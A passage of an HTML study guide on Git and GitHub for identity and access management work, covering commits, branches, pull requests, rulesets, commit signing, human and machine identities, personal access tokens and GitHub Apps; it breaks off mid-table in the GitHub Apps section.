<section id="accueil" data-group="Get started" data-title="Home" class="hero">
  <div class="eyebrow">Upskilling guide · October 2026 edition</div>
  <h1>Master <em>GitHub</em>, and above all who is allowed to do what.</h1>
  <p class="lead">This guide starts from zero: Git, branches, pull requests. Then it goes all the way to what an IAM engineer needs to know: human and machine identities, GitHub Apps, tokens, OIDC to Azure and Vault, branch protection, secrets, auditing.</p>
  <div class="meta-row">
    <span class="chip">Git 2.x</span>
    <span class="chip">GitHub.com · Enterprise Cloud</span>
    <span class="chip">Actions · OIDC</span>
    <span class="chip ok">good habit</span><span class="chip chg">pitfall</span><span class="chip fail">risk</span>
  </div>
  <div class="note">
    <b>How to read this guide</b>
    <p>Parts 1 to 3 (Understand, Git in practice, Collaborate) are the foundations: don't skip them. The following parts (Identities, Actions, OIDC, Security, Governance) are the IAM core. Each part points to a lab to do on your personal GitHub account.</p>
    <p>The bar at the top searches this guide; the <b>Official docs search</b> tab opens docs.github.com and other official sources.</p>
  </div>
</section>

<section id="parcours" data-group="Get started" data-title="Suggested path">
  <div class="eyebrow">Learning plan</div>
  <h2>Your 90-day path</h2>
  <div class="tbl"><table>
    <thead><tr><th>Period</th><th>Goal</th><th>Related lab</th></tr></thead>
    <tbody>
      <tr><td>Week 1</td><td>Local Git: commit, branch, merge, undo a mistake</td><td>Lab 1</td></tr>
      <tr><td>Week 2</td><td>GitHub: remote repository, pull request, review, protection rules</td><td>Labs 2 and 3</td></tr>
      <tr><td>Weeks 3–4</td><td>Human identities: 2FA, roles, teams, SSO/SCIM (in theory, since it requires an Enterprise plan)</td><td>Lab 4</td></tr>
      <tr><td>Weeks 5–6</td><td>Machine identities: fine-grained PAT, GitHub App, deploy key; rotation and revocation</td><td>Labs 5 and 6</td></tr>
      <tr><td>Weeks 7–8</td><td>GitHub Actions: workflows, secrets, environments, least-privilege permissions</td><td>Lab 7</td></tr>
      <tr><td>Weeks 9–10</td><td>Secretless OIDC to Azure (Entra ID); Vault and AWS for reading</td><td>Lab 8</td></tr>
      <tr><td>Weeks 11–13</td><td>Security and governance: secret scanning, Dependabot, signing, audit, machine identity inventory</td><td>Labs 9 and 10</td></tr>
    </tbody>
  </table></div>
  <p>Official certifications, in order: <b>GitHub Foundations</b>, then <b>GitHub Actions</b>, then <b>GitHub Advanced Security</b> and <b>GitHub Administration</b>. The free <b>GitHub Skills</b> courses (skills.github.com) offer guided exercises that complement this guide well.</p>
</section>

<section id="git-vs-github" data-group="Understand" data-title="Git or GitHub?">
  <div class="eyebrow">The basics</div>
  <h2>Git or GitHub?</h2>
  <p>They are often confused. They are two different things:</p>
  <div class="grid2">
    <div class="card"><h4>Git</h4><p>Free software, installed on your PC, that records the version history of a folder. It works without the Internet and without GitHub.</p></div>
    <div class="card"><h4>GitHub</h4><p>An online service (Microsoft) that hosts Git repositories and adds collaboration: pull requests, reviews, automation (Actions), security, access management.</p></div>
  </div>
  <p>Similar platforms: GitLab, Bitbucket, Azure DevOps Repos. What you learn about Git applies everywhere; what concerns GitHub (Actions, Apps, rulesets) is specific to it.</p>
  <h3>Why it is an IAM topic</h3>
  <p>In a large company, GitHub holds application code, but also infrastructure (Terraform), configuration (Ansible) and the pipelines that deploy to production. Whoever can change a branch or a workflow can often, indirectly, change production. "Who has access?", "with which identity?", "with which token?" and "who approved?" are therefore first-class security questions.</p>
</section>

<section id="modele-git" data-group="Understand" data-title="How Git works">
  <div class="eyebrow">Under the hood</div>
  <h2>How Git works</h2>
  <h3>The three areas</h3>
  <figure>
    <div class="diagram">
    <svg viewBox="0 0 860 210" role="img" aria-labelledby="zonesTen">
      <title id="zonesTen">Git areas: working directory, index, local repository, remote repository</title>

      <g style="font:12px var(--f-body)">

        <text x="24" y="68" style="fill:var(--ink);font:700 14px var(--f-display)">Working directory</text>
        <text x="24" y="90" style="fill:var(--ink-2)">your files, freely</text><text x="24" y="108" style="fill:var(--ink-2)">modified</text>
        <rect x="235" y="40" width="180" height="90" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="249" y="68" style="fill:var(--ink);font:700 14px var(--f-display)">Index (staging)</text>
        <text x="249" y="90" style="fill:var(--ink-2)">what goes into</text><text x="249" y="108" style="fill:var(--ink-2)">the next commit</text>
        <rect x="460" y="40" width="180" height="90" rx="8" style="fill:var(--accent-soft);stroke:var(--accent)"/>

        <text x="474" y="90" style="fill:var(--ink-2)">commit history</text><text x="474" y="108" style="fill:var(--ink-2)">on your PC</text>
        <rect x="685" y="40" width="165" height="90" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="699" y="68" style="fill:var(--ink);font:700 14px var(--f-display)">Remote repo</text>
        <text x="699" y="90" style="fill:var(--ink-2)">origin, on GitHub</text>
      </g>
      <g style="fill:none;stroke:var(--ink-2);stroke-width:1.4">
        <path d="M190 70 H231" marker-end="url(#arEn)"/><path d="M415 70 H456" marker-end="url(#arEn)"/><path d="M640 70 H681" marker-end="url(#arEn)"/>
        <path d="M681 110 H644" marker-end="url(#arEn)"/><path d="M460 150 Q300 195 105 134" marker-end="url(#arEn)"/>
      </g>
      <g style="font:600 12px var(--f-mono);fill:var(--accent)">
        <text x="193" y="60">add</text><text x="414" y="60">commit</text><text x="648" y="60">push</text><text x="644" y="128">fetch/pull</text><text x="250" y="188">switch / restore</text>
      </g>
    </svg></div>
    <figcaption>You edit in the working directory, choose what to record with <code>git add</code>, record it with <code>git commit</code>, and share it with <code>git push</code>.</figcaption>
  </figure>
  <h3>Key concepts</h3>
  <dl class="kv">
    <dt>Commit</dt><dd>A complete snapshot of the project at a point in time, with an author, a date, a message and a unique identifier (a SHA hash, e.g. <code>3f9a1c2</code>). A commit points to its parent(s): history is a chain.</dd>
    <dt>Branch</dt><dd>A simple movable label pointing to a commit. Creating a branch is instant and copies nothing.</dd>
    <dt>HEAD</dt><dd>"Where you are": the branch (or commit) currently checked out.</dd>
    <dt>main</dt><dd>The main branch by convention (formerly <code>master</code>).</dd>
    <dt>Remote</dt><dd>A remote repository; <code>origin</code> is the default name of the one you cloned.</dd>
    <dt>Merge</dt><dd>Joining the history of two branches.</dd>
    <dt>Rebase</dt><dd>Replaying your commits on top of another branch to get a linear history.</dd>
    <dt>Tag</dt><dd>A fixed label on a commit (e.g. <code>v1.4.0</code>), used for releases.</dd>
  </dl>
  <div class="note warn"><b>A key point for security</b><p>In Git, a commit's author (<code>user.name</code>, <code>user.email</code>) is declarative: anyone can write someone else's name. Only a commit <b>signature</b> proves who created it, and only the identity of whoever <b>pushes</b> is verified by GitHub. See the "Signing your commits" section.</p></div>
</section>

<section id="organisation" data-group="Understand" data-title="Accounts, organizations, enterprise">
  <div class="eyebrow">Structure</div>
  <h2>Accounts, organizations and enterprise</h2>
  <figure>

    <svg viewBox="0 0 860 250" role="img" aria-labelledby="orgTen">

      <text x="26" y="38" style="fill:var(--accent);font:800 15px var(--f-display)">Enterprise (enterprise account)</text>
      <text x="26" y="58" style="fill:var(--ink-2);font:12px var(--f-body)">SSO, SCIM, global policies, billing, consolidated audit log</text>
      <g style="font:12px var(--f-body)">

        <rect x="224" y="110" width="183" height="100" rx="6" style="fill:var(--surface-2);stroke:var(--line)"/>
        <text x="236" y="130" style="fill:var(--ink);font-weight:700">Repositories</text><text x="236" y="150" style="fill:var(--ink-2)">infra-terraform</text><text x="236" y="168" style="fill:var(--ink-2)">ansible-iam</text><text x="236" y="186" style="fill:var(--ink-2)">vault-policies</text>
        <rect x="438" y="74" width="190" height="150" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="452" y="98" style="fill:var(--ink);font:700 14px var(--f-display)">Another organization</text><text x="452" y="120" style="fill:var(--ink-2)">its teams, its repos,</text><text x="452" y="138" style="fill:var(--ink-2)">its GitHub Apps</text>
        <rect x="645" y="74" width="190" height="150" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="659" y="98" style="fill:var(--ink);font:700 14px var(--f-display)">Accounts</text><text x="659" y="120" style="fill:var(--ink-2)">humans (members)</text><text x="659" y="138" style="fill:var(--ink-2)">GitHub Apps (machines)</text><text x="659" y="156" style="fill:var(--ink-2)">outside collaborators</text><text x="659" y="174" style="fill:var(--ink-2)">machine users (avoid)</text>
      </g>
    </svg></div>
  </figure>
  <dl class="kv">
    <dt>Personal account</dt><dd>One person, one account. On classic GitHub.com, the account belongs to the person, not the company.</dd>
    <dt>Organization</dt><dd>A shared space that owns repositories, teams and security settings.</dd>
    <dt>Team</dt><dd>A group of members. Rights are granted to teams, never to individuals one by one.</dd>
    <dt>Enterprise</dt><dd>The level above organizations (GitHub Enterprise Cloud): mandatory SSO, automatic provisioning, common policies, global auditing.</dd>
    <dt>Enterprise Managed Users (EMU)</dt><dd>A flavor of Enterprise Cloud where accounts are created and deleted by your identity provider (Entra ID): the company owns the accounts, as in a directory.</dd>
  </dl>
  <h3>Repository visibility</h3>
  <div class="tbl"><table>
    <thead><tr><th>Visibility</th><th>Who can see it</th></tr></thead>
    <tbody>
      <tr><td><code>public</code></td><td>The whole Internet</td></tr>
      <tr><td><code>private</code></td><td>Only authorized people and teams</td></tr>
      <tr><td><code>internal</code></td><td>Every member of the enterprise (Enterprise only): useful for "inner source"</td></tr>
    </tbody>
  </table></div>
  <div class="note danger"><b>A repository made public by mistake</b><p>A classic leak: a repository switched to public, or created on a personal account with company code. Enterprise organizations usually forbid creating public repositories and forking private repositories to personal accounts.</p></div>
</section>

<section id="config" data-group="Git in practice" data-title="Install and configure">
  <div class="eyebrow">Step 1</div>
  <h2>Installing and configuring Git</h2>
  <div class="code"><span class="lbl">Linux Mint / Ubuntu</span><pre>sudo apt install -y git
git --version

<span class="c"># Identity used in your commits</span>
git config --global user.name "kevmat242"
git config --global user.email "your-email@example.com"
git config --global init.defaultBranch main
git config --global pull.rebase true          <span class="c"># cleaner history</span>
git config --global core.editor "nano"        <span class="c"># or "code --wait" for VS Code</span>
git config --list --show-origin               <span class="c"># see the whole configuration</span></pre></div>
  <div class="note ok"><b>Hide your e-mail address</b><p>In GitHub, <b>Settings → Emails</b>, tick "Keep my email addresses private" and use the <code>ID+username@users.noreply.github.com</code> address shown there as <code>user.email</code>. Your real address will not appear in public history.</p></div>
  <h3>Authenticating to GitHub</h3>
  <div class="tbl"><table>
    <thead><tr><th>Method</th><th>Use</th></tr></thead>
    <tbody>
      <tr><td><b>SSH key</b> (<code>git@github.com:…</code>)</td><td>What you set up. Simple and safe for a workstation.</td></tr>
      <tr><td><b>HTTPS + Git Credential Manager</b></td><td>Browser sign-in, token stored securely. Common on Windows.</td></tr>
      <tr><td><b>GitHub CLI</b> (<code>gh auth login</code>)</td><td>For Git and for driving GitHub from the command line (PRs, issues, API).</td></tr>
      <tr><td>Account password</td><td>Refused by GitHub for Git since 2021.</td></tr>
    </tbody>
  </table></div>
  <div class="code"><span class="lbl">Install GitHub CLI</span><pre>sudo apt install -y gh        <span class="c"># or from cli.github.com for the latest version</span>
gh auth login                 <span class="c"># GitHub.com → SSH → use your existing key → browser</span>
gh auth status</pre></div>
</section>

<section id="commandes" data-group="Git in practice" data-title="Basic commands">
  <div class="eyebrow">Step 2</div>
  <h2>Basic commands</h2>
  <div class="code"><span class="lbl">The daily cycle</span><pre>git clone git@github.com:kevmat242/mes-guides.git   <span class="c"># get a repository</span>
cd mes-guides
git status                     <span class="c"># what changed? (type it all the time)</span>
git diff                       <span class="c"># details of unstaged changes</span>
git add file.txt               <span class="c"># stage a file</span>
git add -p                     <span class="c"># pick hunk by hunk (very useful)</span>
git diff --staged              <span class="c"># what goes into the commit</span>
git commit -m "Add the home page"
git push                       <span class="c"># send to GitHub</span>
git pull                       <span class="c"># get the others' changes</span>
git log --oneline --graph --all   <span class="c"># readable history</span></pre></div>
  <h3>Writing good commit messages</h3>
  <ul>
    <li>A short first line (≈ 50 characters), in the imperative: "Add the token rotation rule".</li>
    <li>If needed, a blank line then the <i>why</i> of the change.</li>
    <li>One commit = one logical change. Avoid "misc fixes".</li>
    <li>Many teams follow <i>Conventional Commits</i>: <code>feat:</code>, <code>fix:</code>, <code>docs:</code>, <code>chore:</code>.</li>
  </ul>
</section>

<section id="branches" data-group="Git in practice" data-title="Branches, merges, conflicts">
  <div class="eyebrow">Step 3</div>
  <h2>Branches, merges and conflicts</h2>
  <div class="code"><pre>git switch -c feature/pat-rotation     <span class="c"># create a branch and switch to it</span>
<span class="c"># … changes, add, commit …</span>
git push -u origin feature/pat-rotation   <span class="c"># publish the branch</span>
git switch main                        <span class="c"># back to main</span>
git pull                               <span class="c"># update main</span>
git merge feature/pat-rotation         <span class="c"># merge (in practice: through a pull request)</span>
git branch -d feature/pat-rotation     <span class="c"># delete the local branch</span></pre></div>
  <h3>Merge or rebase?</h3>
  <div class="grid2">
    <div class="card"><h4>merge</h4><p>Creates a merge commit joining both histories. Rewrites nothing: safe on a shared branch.</p></div>
    <div class="card"><h4>rebase</h4><p>Replays your commits on top of <code>main</code>: linear history. Rewrites commit identifiers: keep it for <b>your</b> branch, never for <code>main</code>.</p></div>
  </div>
  <div class="code"><span class="lbl">Update your branch with main</span><pre>git fetch origin
git rebase origin/main
git push --force-with-lease     <span class="c"># never a plain --force</span></pre></div>
  <h3>Resolving a conflict without panic</h3>
  <p>A conflict happens when two branches change the same lines. Git stops and marks the file:</p>
  <div class="code"><pre>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
token_max_lifetime_days = 90
=======
token_max_lifetime_days = 30
&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature/pat-rotation</pre></div>
  <ol class="steps">
    <li><code>git status</code> lists the conflicting files.</li>
    <li>Open each file, keep the right version (or a mix), remove the <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>, <code>=======</code>, <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> markers. VS Code offers "Accept Current / Incoming / Both" buttons.</li>
    <li><code>git add file</code> to mark the conflict as resolved.</li>
    <li><code>git commit</code> (after a merge) or <code>git rebase --continue</code> (after a rebase).</li>
    <li>Lost? <code>git merge --abort</code> or <code>git rebase --abort</code> returns to the previous state.</li>
  </ol>
</section>

<section id="erreurs" data-group="Git in practice" data-title="Fixing mistakes">
  <div class="eyebrow">Safety net</div>
  <h2>Fixing your mistakes</h2>
  <div class="tbl"><table>
    <thead><tr><th>Situation</th><th>Command</th></tr></thead>
    <tbody>
      <tr><td>Discard uncommitted changes to a file</td><td><code>git restore file</code></td></tr>
      <tr><td>Unstage a file (keeping the changes)</td><td><code>git restore --staged file</code></td></tr>
      <tr><td>Fix the last commit (message or forgotten file), not yet pushed</td><td><code>git commit --amend</code></td></tr>
      <tr><td>Undo an already pushed commit (create an inverse commit)</td><td><code>git revert &lt;sha&gt;</code></td></tr>
      <tr><td>Go back locally, keeping the changes</td><td><code>git reset --soft HEAD~1</code></td></tr>
      <tr><td>Put work in progress aside</td><td><code>git stash</code> then <code>git stash pop</code></td></tr>
      <tr><td>Find a "lost" commit (after a bad reset)</td><td><code>git reflog</code> then <code>git switch -c rescue &lt;sha&gt;</code></td></tr>
    </tbody>
  </table></div>
  <div class="note warn"><b>The rule</b><p>On what is already pushed and shared, you <b>add</b> (revert), you don't <b>rewrite</b> (reset, amend, rebase). <code>git reset --hard</code> erases your uncommitted changes for good: double-check.</p></div>
</section>

<section id="gitignore" data-group="Git in practice" data-title=".gitignore and secrets">
  <div class="eyebrow">Hygiene</div>
  <h2>.gitignore and secrets: what must never be committed</h2>
  <div class="code"><span class="lbl">A typical .gitignore for an IAM / infra repository</span><pre><span class="c"># Secrets and keys</span>
*.pem
*.key
*.p12
*.pfx
id_*
.env
.env.*
vault-files/
*vault-pass*

<span class="c"># Terraform</span>
.terraform/
*.tfstate
*.tfstate.*
*.tfplan
crash.log

<span class="c"># Ansible</span>
*.retry
logs/

<span class="c"># Editors and system</span>
.vscode/
.idea/
.DS_Store</pre></div>
  <div class="note danger"><b>You pushed a secret? In this order:</b>
    <ol>
      <li><b>Revoke it immediately</b> (token, password, key, certificate) and create a new one. It is the only action that truly protects you: the secret may have been copied within seconds (bots scan GitHub continuously).</li>
      <li>Check the logs of the affected system for any use.</li>
      <li>Only then clean the history with <code>git filter-repo</code> (or BFG) and force the update, coordinating with the team.</li>
      <li>Notify the security team according to company procedure.</li>
    </ol>
    <p>Deleting the file in a new commit is not enough: the secret remains in the history.</p></div>
</section>

<section id="pr" data-group="Collaborate" data-title="Pull requests and review">
  <div class="eyebrow">Working together</div>
  <h2>Pull requests and code review</h2>
  <p>A <b>pull request</b> (PR) is a request to merge one branch into another, with discussion, review and automated checks. It is the central control point: this is where the "four eyes" principle happens.</p>
  <h3>GitHub Flow, the most used model</h3>
  <ol class="steps">
    <li><code>main</code> is always deployable.</li>
    <li>For every change: a short branch (<code>feature/…</code>, <code>fix/…</code>).</li>
    <li>Open a PR early (as a "Draft") to discuss.</li>
    <li>Automated checks (CI) run; one or more reviewers approve.</li>
    <li>Merge into <code>main</code>, delete the branch, deploy.</li>
  </ol>
  <div class="code"><span class="lbl">With GitHub CLI</span><pre>gh pr create --fill --draft          <span class="c"># open a draft PR</span>
gh pr ready                          <span class="c"># mark it ready for review</span>
gh pr checks                         <span class="c"># CI status</span>
gh pr review 12 --approve            <span class="c"># approve PR #12</span>
gh pr merge 12 --squash --delete-branch</pre></div>
  <h3>The three ways to merge</h3>
  <div class="tbl"><table>
    <thead><tr><th>Mode</th><th>Result</th></tr></thead>
    <tbody>
      <tr><td>Merge commit</td><td>Keeps every commit + a merge commit</td></tr>
      <tr><td>Squash and merge</td><td>A single clean commit per PR (often the company default)</td></tr>
      <tr><td>Rebase and merge</td><td>Commits replayed in sequence, no merge commit</td></tr>
    </tbody>
  </table></div>
  <h3>CODEOWNERS: who must review what</h3>
  <div class="code"><span class="lbl">.github/CODEOWNERS</span><pre><span class="c"># The last matching pattern wins</span>
*                         @example-iam/iam-devs
/terraform/entra/         @example-iam/iam-admins
/.github/workflows/       @example-iam/platform-security
/.github/CODEOWNERS       @example-iam/platform-security</pre></div>
  <p>Combined with the "Require review from Code Owners" rule, a change to workflows or to Entra ID access cannot be merged without the responsible team's approval.</p>
  <div class="note ok"><b>Good habit for an IAM reviewer</b><p>In a PR, look first at: <code>.github/workflows/</code> files (who can trigger what, with which permissions), permission changes (roles, groups, policies), new dependencies or third-party actions, and anything that looks like a secret.</p></div>
</section>

<section id="rulesets" data-group="Collaborate" data-title="Protecting branches">
  <div class="eyebrow">Guardrails</div>
  <h2>Protecting branches: rulesets</h2>
  <p><b>Rulesets</b> (Settings → Rulesets) are gradually replacing the older "branch protection rules". They can apply to one repository or to a whole organization.</p>
  <div class="tbl"><table>
    <thead><tr><th>Rule</th><th>Effect</th><th>Recommended on main</th></tr></thead>
    <tbody>
      <tr><td>Restrict deletions</td><td>Forbids deleting the branch</td><td>Yes</td></tr>
      <tr><td>Block force pushes</td><td>Forbids rewriting history</td><td>Yes</td></tr>
      <tr><td>Require a pull request before merging</td><td>No more direct pushes; mandatory review (number of approvals, Code Owners, dismiss stale approvals)</td><td>Yes, at least 1 approval</td></tr>
      <tr><td>Require status checks to pass</td><td>CI must be green</td><td>Yes</td></tr>
      <tr><td>Require signed commits</td><td>Only signed, verified commits get through</td><td>Depending on policy</td></tr>
      <tr><td>Require linear history</td><td>No merge commits</td><td>Optional</td></tr>
      <tr><td>Require deployments to succeed</td><td>The staging deployment must have succeeded</td><td>Optional</td></tr>
    </tbody>
  </table></div>
  <p><b>Enforcement status</b>: <code>Active</code> (enforced), <code>Evaluate</code> (measures without blocking, Enterprise plan), <code>Disabled</code>. The <b>bypass list</b> says who can get around the rules: keep it empty or limited to an emergency role, since every bypass is a hole in your control.</p>
  <div class="note warn"><b>Pitfall</b><p>Repository admins can bypass the old protection rules unless "Do not allow bypassing" is ticked. With rulesets, nothing is bypassed except what is explicitly in the bypass list.</p></div>
</section>

<section id="signature" data-group="Collaborate" data-title="Signing your commits">
  <div class="eyebrow">Prove the author</div>
  <h2>Signing your commits</h2>
  <p>A signature cryptographically proves who created a commit. GitHub then shows a <span class="chip ok">Verified</span> badge. The simplest way: sign with your existing SSH key.</p>
  <div class="code"><span class="lbl">Signing with SSH</span><pre>git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
git config --global tag.gpgsign true</pre></div>
  <p>Then on GitHub: <b>Settings → SSH and GPG keys → New SSH key</b>, choose <b>Key type: Signing Key</b> and paste the same public key (it must be added a second time, as a signing key). Also enable <b>Vigilant mode</b>: unsigned commits under your name will be flagged <span class="chip chg">Unverified</span>.</p>
  <div class="code"><pre>git commit --allow-empty -m "Signature test"
git log --show-signature -1</pre></div>
  <p>Alternatives: GPG (the historical way), or <b>gitsign</b> (Sigstore), which signs with your OIDC identity and a very short-lived certificate, with no key to manage. Commits made from GitHub's web interface are signed automatically by GitHub.</p>
</section>

<section id="humains" data-group="Identities" data-title="Human identities">
  <div class="eyebrow">Who is who</div>
  <h2>Human identities</h2>
  <h3>Account authentication</h3>
  <ul>
    <li><b>2FA is mandatory</b> for every code contributor on GitHub.com. In order of preference: <b>passkey</b> or security key (FIDO2), a TOTP app, and SMS only as a last resort.</li>
    <li>Keep the <b>recovery codes</b> in a vault; without them, losing the second factor can mean losing the account.</li>
    <li>An organization can <b>require 2FA</b> for all its members (members without 2FA are removed).</li>
  </ul>
  <h3>SAML or OIDC SSO with Entra ID</h3>
  <p>On GitHub Enterprise Cloud, the organization or enterprise delegates authentication to your identity provider (IdP). Two models:</p>
  <div class="tbl"><table>
    <thead><tr><th></th><th>Personal accounts + SAML SSO</th><th>Enterprise Managed Users (EMU)</th></tr></thead>
    <tbody>
      <tr><td>Account owner</td><td>The person</td><td>The company (created by the IdP)</td></tr>
      <tr><td>Sign-in</td><td>GitHub account, then a mandatory pass through the IdP to access the organization's resources</td><td>Only through the IdP (SAML, or OIDC with Entra ID, which enables Conditional Access)</td></tr>
      <tr><td>Provisioning</td><td>Manual invitation, or SCIM for membership</td><td>SCIM: automatic creation, update and suspension from Entra ID</td></tr>
      <tr><td>Employee departure</td><td>The account remains; it must be removed from the organization</td><td>Disabled in Entra ID ⇒ suspended in GitHub</td></tr>
      <tr><td>Public contributions</td><td>Possible</td><td>Impossible (isolated accounts, named <code>handle_shortcode</code>)</td></tr>
    </tbody>
  </table></div>
  <p><b>Team sync</b> / SCIM groups: a GitHub team can be linked to an Entra ID group. Group membership (managed by your IGA, with access reviews) automatically grants repository access. This is the model to aim for.</p>
  <div class="note warn"><b>Tokens and SSO</b><p>With SAML SSO, a PAT or SSH key must be <b>authorized for the organization</b> (the "Configure SSO" button on the token) before it can access its resources. Revoking a session on the IdP side does not necessarily cut off a token that was already authorized: hence the importance of short lifetimes.</p></div>
  <h3>Organization roles</h3>
  <div class="tbl"><table>
    <thead><tr><th>Role</th><th>Powers</th></tr></thead>
    <tbody>
      <tr><td>Owner</td><td>Everything: members, billing, security, deletion. Limit to 2 or 3 people, ideally with just-in-time access.</td></tr>
      <tr><td>Member</td><td>Access according to teams and the organization's "base permission"</td></tr>
      <tr><td>Security manager</td><td>Read access to every repository and management of security alerts, without write rights</td></tr>
      <tr><td>Billing manager</td><td>Billing only</td></tr>
      <tr><td>Custom roles</td><td>Fine-grained permissions (e.g. manage rulesets, view the audit log) without being Owner</td></tr>
      <tr><td>Outside collaborator</td><td>A contractor added to a specific repository, outside the organization: watch closely</td></tr>
    </tbody>
  </table></div>
  <h3>Repository roles</h3>
  <div class="tbl"><table>
    <thead><tr><th>Role</th><th>Can</th></tr></thead>
    <tbody>
      <tr><td>Read</td><td>View, clone, open issues</td></tr>
      <tr><td>Triage</td><td>+ manage issues and PRs, without writing code</td></tr>
      <tr><td>Write</td><td>+ push branches, merge (within the rulesets' limits)</td></tr>
      <tr><td>Maintain</td><td>+ manage some repository settings</td></tr>
      <tr><td>Admin</td><td>Everything, including protection rules, secrets and access</td></tr>
    </tbody>
  </table></div>
  <div class="note ok"><b>Best practices</b><ul>
    <li>Organization <b>base permission</b> set to <code>No permission</code> or <code>Read</code>, never <code>Write</code>.</li>
    <li>Rights granted to <b>teams</b> (linked to Entra ID groups), not to individuals.</li>
    <li><code>Admin</code> rare on repositories: it allows reading and changing secrets and disabling protections.</li>
    <li>Quarterly review: owners, outside collaborators, inactive members, Admin rights.</li>
  </ul></div>
</section>

<section id="machines" data-group="Identities" data-title="Machine identities">
  <div class="eyebrow">The heart of the matter</div>
  <h2>Machine identities on GitHub</h2>
  <p>A pipeline, a tool (Terraform, Ansible, a scanner, a bot) or another application talking to GitHub needs an identity. This is where most risks hide: tokens with no expiry date, tied to the account of someone who left long ago, with rights over the whole organization.</p>
  <h3>The comparison to know by heart</h3>
  <div class="tbl"><table>
    <thead><tr><th>Identity</th><th>Tied to</th><th>Lifetime</th><th>Scope</th><th>Verdict</th></tr></thead>
    <tbody>
      <tr><td><b>GITHUB_TOKEN</b></td><td>One workflow run</td><td>The job's duration</td><td>The workflow's repository, adjustable permissions</td><td><span class="chip ok">Preferred</span> in Actions</td></tr>
      <tr><td><b>GitHub App</b></td><td>The application (not a person)</td><td>Installation token: 1 h</td><td>Fine-grained permissions × chosen repositories</td><td><span class="chip ok">Preferred</span> for any lasting automation</td></tr>
      <tr><td><b>OIDC token</b> (Actions)</td><td>One job</td><td>Minutes</td><td>Exchanged for cloud or Vault access</td><td><span class="chip ok">Preferred</span> to reach outside GitHub</td></tr>
      <tr><td><b>Fine-grained PAT</b></td><td>A person</td><td>Mandatory expiry (max per policy)</td><td>One owner, chosen repositories and permissions</td><td><span class="chip chg">Acceptable</span> for personal use or a one-off script</td></tr>
      <tr><td><b>Deploy key</b></td><td>One repository</td><td>Unlimited</td><td>A single repository, read (or write)</td><td><span class="chip chg">Acceptable</span> for a server that clones a repository</td></tr>
      <tr><td><b>Classic PAT</b></td><td>A person</td><td>Can have no expiry</td><td>Every repository the person can access, broad scopes</td><td><span class="chip fail">Avoid</span></td></tr>
      <tr><td><b>"Machine user" account</b></td><td>A fake human</td><td>Unlimited</td><td>That of a member</td><td><span class="chip fail">Avoid</span> (license, shared password and 2FA)</td></tr>
    </tbody>
  </table></div>
  <h3>Choosing the right identity</h3>
  <ol>
    <li>Runs in GitHub Actions and only touches its own repository? <b>GITHUB_TOKEN</b> with minimal permissions.</li>
    <li>Needs to reach Azure, AWS, GCP or Vault? <b>OIDC</b>, no stored secret.</li>
    <li>Must act on several repositories or from outside (Terraform managing the organization, a bot, an internal tool)? <b>GitHub App</b>.</li>
    <li>A server only needs to clone a repository? A read-only <b>deploy key</b>.</li>
    <li>A human needs a token for a personal script? A <b>fine-grained PAT</b> with a short expiry.</li>
  </ol>
  <h3>Fine-grained PAT: the right settings</h3>
  <ul>
    <li><b>Resource owner</b>: your account or an organization (one token = one owner).</li>
    <li><b>Expiration</b>: 7 to 90 days depending on use, never "No expiration".</li>
    <li><b>Repository access</b>: "Only select repositories".</li>
    <li><b>Permissions</b>: the bare minimum, read-only when possible (e.g. <code>Contents: Read</code>, <code>Metadata: Read</code>).</li>
    <li>On the organization side: <b>mandatory approval</b> of fine-grained PATs (on by default), and the option to <b>restrict classic PATs</b>.</li>
  </ul>
  <div class="note"><b>Current limits of fine-grained PATs</b><p>They don't cover everything yet: one owner per token, no access to APIs managing the enterprise (SCIM…), nor to the Packages and Checks APIs. GitHub aims to eventually let organizations disable classic PATs, with no announced date.</p></div>
</section>

<section id="apps" data-group="Identities" data-title="GitHub Apps in depth">
  <div class="eyebrow">The reference machine identity</div>
  <h2>GitHub Apps in depth</h2>
  <p>A GitHub App is an identity of its own, with its name (<code>my-bot[bot]</code>), its permissions and its installations. It depends on no employee: a departure breaks nothing, and its actions are clearly attributed in the audit log.</p>
  <figure>
    <div class="diagram">
    <svg viewBox="0 0 860 220" role="img" aria-labelledby="appTen">
      <title id="appTen">GitHub App authentication</title>

        <text x="24" y="124" style="fill:var(--accent);font-weight:700">① signs a JWT (10 min)</text>

      </g>
      <g style="fill:none;stroke:var(--ink-2);stroke-width:1.4"><path d="M240 110 H316" marker-end="url(#ar3en)"/><path d="M550 110 H626" marker-end="url(#ar3en)"/></g>
    </svg></div>
  </figure>
  <h3>Creating an App (personal account or organization)</h3>
  <ol class="steps">
    <li><b>Settings → Developer settings → GitHub Apps → New GitHub App.</b></li>
    <li>A unique name, a homepage URL (your repository's is fine), untick <b>Webhook → Active</b> if you don't need it.</li>
    <li><b>Repository permissions</b>: only what is needed (e.g. <code>Contents: Read and write</code>, <code>Pull requests: Read and write</code>).</li>
    <li><b>Where can this GitHub App be installed?</b>: "Only on this account".</li>
    <li>Create it, note the <b>App ID</b>, then <b>Generate a private key</b>: a <code>.pem</code> file downloads. Store it in a vault and delete it from your Downloads folder.</li>
    <li><b>Install App</b> → "Only select repositories".</li>
  </ol>
  <div class="code"><span class="lbl">Using the App in a workflow</span><pre><span class="k">steps:</span>
  - <span class="k">id:</span> app-token
    <span class="k">uses:</span> actions/create-github-app-token@v2
    <span class="k">with:</span>
      <span class="k">app-id:</span> ${{ vars.IAM_BOT_APP_ID }}
      <span class="k">private-key:</span> ${{ secrets.IAM_BOT_PRIVATE_KEY }}
      <span class="k">repositories:</span> <span class="s">ansible-iam,infra-terraform</span>   <span class="c"># restrict further</span>
  - <span class="k">run:</span> gh api repos/${{ github.repository_owner }}/ansible-iam --jq .full_name
    <span class="k">env:</span>
      <span class="k">GH_TOKEN:</span> ${{ steps.app-token.outputs.token }}</pre></div>
  <h3>A machine identity's lifecycle (like a certificate's)</h3>
  <p>You know this cycle from certificates managed in Venafi or Sectigo. It applies as is to GitHub machine identities:</p>
  <div class="tbl"><table>
    <thead><tr><th>Stage</th><th>For a GitHub App / a token</th></tr></thead>
    <tbody>
